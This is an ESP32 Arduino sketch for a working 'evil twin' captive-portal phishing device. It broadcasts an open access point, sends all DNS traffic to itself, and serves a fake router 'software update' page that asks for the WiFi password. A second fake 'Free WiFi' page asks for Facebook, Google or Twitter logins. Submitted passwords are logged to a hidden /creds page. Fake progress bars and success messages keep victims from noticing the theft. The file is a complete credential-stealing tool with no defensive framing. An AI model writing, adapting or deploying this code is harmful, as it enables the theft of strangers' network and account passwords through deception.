#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <LittleFS.h>

// ======== CONFIG ========
String SUBTITLE = "";

// Router update strings
const String UPDATE_TITLE = "Network software update required";
const String UPDATE_BODY = "To complete the update process, enter your WiFi password";
const String UPDATE_POST_TITLE = "System update in progress...";
const String UPDATE_POST_BODY = "Please do not interrupt the process - it may take a few minutes...";

// Social login strings
const String LOGIN_TITLE = "Log in using social media";
const String LOGIN_BODY = "Select a login method and enter your credentials";
const String LOGIN_POST_TITLE = "Logging in...";
const String LOGIN_POST_BODY = "Please wait while we connect you...";

const String PASS_TITLE = "/LOGS/";
const String CLEAR_TITLE = "Clear logs";
const String CONFIG_TITLE = "System configuration";

// ======== AP NAME ========
String currentSSID = "Evil_Service";
const String defaultSSID = "Evil_Service";
const byte DNS_PORT = 53;
IPAddress APIP(172, 0, 0, 1);

// ======== GLOBALS ========
DNSServer dnsServer;
WebServer webServer(80);

String Credentials = "";

// ======== HTML HELPERS ========
String header(String t) {
  String CSS = "body{font-family:'Segoe UI',Roboto,Oxygen,Ubuntu,Cantarell,sans-serif;background:#121212;color:#e0e0e0;margin:0;padding:0;min-height:100vh;}"
               "nav{background:linear-gradient(135deg,#0062ff,#2b83f6);color:white;padding:1.5em;border-radius:0 0 20px 20px;box-shadow:0 4px 12px rgba(0,0,0,0.2);}"
               "nav b{display:block;font-size:1.5em;font-weight:600;margin-bottom:0.3em;}"
               ".container{max-width:600px;margin:2em auto;padding:0 1em;}"
               ".card{background:#1e1e1e;border-radius:12px;padding:2em;margin-bottom:1.5em;box-shadow:0 8px 16px rgba(0,0,0,0.2);border:1px solid #333;}"
               "h1{color:#fff;margin-top:0;font-weight:500;}"
               "p{color:#b0b0b0;line-height:1.6;}"
               "input,select{width:100%;padding:14px;margin:10px 0;border-radius:8px;border:none;background:#2d2d2d;color:#fff;font-size:16px;box-sizing:border-box;transition:all 0.3s ease;border:1px solid #333;}"
               "input:focus,select:focus{outline:none;border-color:#0062ff;background:#333;}"
               "button{width:100%;padding:14px;margin:10px 0;border-radius:8px;border:none;background:linear-gradient(135deg,#0062ff,#2b83f6);color:white;font-size:16px;font-weight:500;cursor:pointer;transition:all 0.3s ease;box-shadow:0 4px 8px rgba(0,0,0,0.2);}"
               "button:hover{transform:translateY(-2px);box-shadow:0 6px 12px rgba(0,0,0,0.3);}"
               "button:active{transform:translateY(0);}"
               ".progress-container{width:100%;background:#2d2d2d;border-radius:8px;margin:2em 0;}"
               ".progress-bar{width:0%;height:24px;background:linear-gradient(135deg,#00c853,#5efc82);border-radius:8px;transition:width 0.5s ease;display:flex;align-items:center;justify-content:center;color:#000;font-weight:500;}"
               "ol{padding-left:1.5em;}"
               "li{margin-bottom:0.8em;color:#b0b0b0;}"
               "a{color:#2b83f6;text-decoration:none;transition:color 0.2s ease;}"
               "a:hover{color:#5da8ff;}"
               ".success-badge{background:linear-gradient(135deg,#00c853,#5efc82);color:#000;padding:0.5em 1em;border-radius:20px;font-weight:600;display:inline-block;margin-bottom:1em;box-shadow:0 4px 8px rgba(0,200,83,0.3);}";
  return "<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name=viewport content='width=device-width, initial-scale=1'>" 
         "<title>" + currentSSID + " :: " + t + "</title><style>" + CSS + "</style>" 
         "</head><body><nav><b>" + currentSSID + "</b>" + SUBTITLE + "</nav>" 
         "<div class=container><div class=card>";
}

String footer() {
  return "</div></div><div style='text-align:center;padding:2em 0;color:#666;font-size:0.9em;'>&copy; Evil Service</div></body></html>";
}

String input(String arg) {
  String v = webServer.arg(arg);
  v.replace("<", "&lt;");
  v.replace(">", "&gt;");
  return v.substring(0, 200);
}

// ======== PAGES ========
String menu() {
  SUBTITLE = "Menu";
  return header("Captive Portal") +
    "<h1>Select portal</h1>" 
    "<p><a href='/router'>Router Update</a></p>" 
    "<p><a href='/social'>Social Login</a></p>" 
    "<p><a href='/creds'>Logs & Settings</a></p>" 
    + footer();
}

// ----- Router update pages -----
String routerIndex() {
  SUBTITLE = "Router Update";
  return header(UPDATE_TITLE) +
    "<h1>" + UPDATE_TITLE + "</h1>" 
    "<p>" + UPDATE_BODY + "</p>" 
    "<form action='/router/post' method='post'>" 
    "<input type=password name=password placeholder='Enter WiFi password' required>" 
    "<button type=submit>Start update</button>" 
    "</form>" + footer();
}

String routerPosted() {
  String password = input("password");
  Credentials += "<li><b>WiFi password:</b> " + password + "</li>";
  String progress = "<h1>" + UPDATE_POST_TITLE + "</h1>" 
                   "<p>" + UPDATE_POST_BODY + "</p>" 
                   "<div class=progress-container><div class=progress-bar id=progress>0%</div></div>" 
                   "<script>var i=0;var progress=setInterval(function(){i++;document.getElementById('progress').style.width=i+'%';document.getElementById('progress').innerHTML=i+'%';if(i>=100){clearInterval(progress);setTimeout(function(){window.location.href='/router/success';},500);}},50);</script>";
  SUBTITLE = "Router Update";
  return header(UPDATE_POST_TITLE) + progress + footer();
}

String routerSuccess() {
  SUBTITLE = "Router Update";
  return header("Update completed") +
    "<div class=success-badge>UPDATE SUCCESSFULLY COMPLETED</div>" 
    "<h1>Your router has been updated</h1>" 
    "<p>Your system has been successfully updated to the latest version.</p>" 
    + footer();
}

// ----- Social login pages -----
String socialIndex() {
  SUBTITLE = "Free WiFi";
  return header(LOGIN_TITLE) +
    "<h1>" + LOGIN_TITLE + "</h1>" 
    "<p>" + LOGIN_BODY + "</p>" 
    "<form action='/social/post' method='post'>" 
    "<select name='provider'><option>Facebook</option><option>Google</option><option>Twitter</option></select>" 
    "<input name='username' placeholder='Email or phone' required>" 
    "<input type=password name='password' placeholder='Password' required>" 
    "<button type=submit>Log in</button></form>" 
    + footer();
}

String socialPosted() {
  String provider = input("provider");
  String user = input("username");
  String pass = input("password");
  Credentials += "<li><b>" + provider + ":</b> " + user + " / " + pass + "</li>";
  String progress = "<h1>" + LOGIN_POST_TITLE + "</h1>" 
                   "<p>" + LOGIN_POST_BODY + "</p>" 
                   "<div class=progress-container><div class=progress-bar id=progress>0%</div></div>" 
                   "<script>var i=0;var progress=setInterval(function(){i++;document.getElementById('progress').style.width=i+'%';document.getElementById('progress').innerHTML=i+'%';if(i>=100){clearInterval(progress);setTimeout(function(){window.location.href='/social/success';},500);}},50);</script>";
  SUBTITLE = "Free WiFi";
  return header(LOGIN_POST_TITLE) + progress + footer();
}

String socialSuccess() {
  SUBTITLE = "Free WiFi";
  return header("Login successful") +
    "<div class=success-badge>LOGIN SUCCESSFUL</div>" 
    "<h1>You are connected</h1>" 
    "<p>You can now access the internet.</p>" 
    + footer();
}

// ----- Logs & Settings -----
String creds() {
  SUBTITLE = "Logs";
  return header(PASS_TITLE) +
    "<h1>" + PASS_TITLE + "</h1>" 
    "<ol>" + Credentials + "</ol><br>" 
    "<h2>Change network name(AP)</h2>" 
    "<form action='/updateconfig' method='post'>" 
    "<input name='ssid' value='" + currentSSID + "' placeholder='Network name (SSID)' required>" 
    "<button type='submit'>save</button></form>" 
    "<form action='/clear' method='post'>" 
    "<button type='submit'>clear</button></form>" 
    "<p style='text-align:center;margin-top:1.5em;'><a href='/'>back</a></p>" 
    + footer();
}

String updateConfig() {
  String newSSID = input("ssid");
  if (newSSID.length() > 0 && newSSID.length() < 32) {
    currentSSID = newSSID;
    WiFi.softAP(currentSSID.c_str());
    SUBTITLE = "Config";
    return header(CONFIG_TITLE) +
      "<h1>" + CONFIG_TITLE + "</h1>" 
      "<p>The network name (SSID) has been changed to: <b>" + currentSSID + "</b></p>" 
      "<p style='text-align:center;'><a href='/'>Back to home page</a></p>" 
      + footer();
  }
  SUBTITLE = "Config";
  return header(CONFIG_TITLE) +
    "<h1>" + CONFIG_TITLE + "</h1>" 
    "<p style='color:#ff6b6b;'>Error: Network name must be between 1 and 32 characters long.</p>" 
    "<p style='text-align:center;'><a href='/creds'>Try again</a></p>" 
    + footer();
}

String clearData() {
  currentSSID = defaultSSID;
  Credentials = "";
  WiFi.softAP(currentSSID.c_str());
  SUBTITLE = "Logs";
  return header(CLEAR_TITLE) +
    "<h1>Data cleared</h1>" 
    "<p>All data has been deleted. Network name restored to default: <b>" + currentSSID + "</b></p>" 
    "<p style='text-align:center;'><a href='/'>Back</a></p>" 
    + footer();
}

// ======== SETUP ========
void setup() {
  delay(1000);
  Serial.begin(115200);
  if(!LittleFS.begin(true)) {
    Serial.println("LittleFS init failed");
  }

  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(currentSSID.c_str());
  dnsServer.start(DNS_PORT, "*", APIP);

  webServer.onNotFound([](){ webServer.sendHeader("Location", String("http://") + APIP.toString(), true); webServer.send(302, "text/plain", ""); });

  webServer.on("/", [](){ webServer.send(200, "text/html", menu()); });
  webServer.on("/router", [](){ webServer.send(200, "text/html", routerIndex()); });
  webServer.on("/router/post", [](){ webServer.send(200, "text/html", routerPosted()); });
  webServer.on("/router/success", [](){ webServer.send(200, "text/html", routerSuccess()); });

  webServer.on("/social", [](){ webServer.send(200, "text/html", socialIndex()); });
  webServer.on("/social/post", [](){ webServer.send(200, "text/html", socialPosted()); });
  webServer.on("/social/success", [](){ webServer.send(200, "text/html", socialSuccess()); });

  webServer.on("/creds", [](){ webServer.send(200, "text/html", creds()); });
  webServer.on("/updateconfig", [](){ webServer.send(200, "text/html", updateConfig()); });
  webServer.on("/clear", [](){ webServer.send(200, "text/html", clearData()); });

  webServer.on("/generate_204", [](){ webServer.sendHeader("Location", "/", true); webServer.send(302, "text/plain", ""); });

  webServer.begin();
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
}

